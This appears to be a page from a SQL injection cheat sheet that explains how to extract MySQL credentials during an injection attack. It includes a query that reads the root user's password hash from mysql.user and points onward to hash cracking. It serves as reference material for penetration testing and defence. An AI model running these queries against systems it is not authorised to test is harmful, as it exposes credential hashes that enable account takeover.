---
title: Database Credentials
description: How to retrieve database credentials in MySQL
category: Information Gathering
order: 5
tags: ["credentials", "authentication", "user data"]
lastUpdated: 2025-03-15
---

## Database Credentials

When performing SQL injection attacks against MySQL, extracting database credentials can provide valuable information for further exploitation.

| Information  | Query                                                                         |
| ------------ | ----------------------------------------------------------------------------- |
| Table        | `mysql.user`                                                                  |
| Columns      | `user`, `password`                                                            |
| Current User | `user()`, `current_user()`, `current_user`, `system_user()`, `session_user()` |

### Examples

```sql
-- Get current user
SELECT current_user;

-- Extract user and password from mysql.user table (requires privileges)
SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = 'root';
```

Note that the password column in MySQL contains hashed values, not plaintext passwords. For more information on password hashing and cracking, see the related entries on [Password Hashing](#) and [Password Cracking](#).
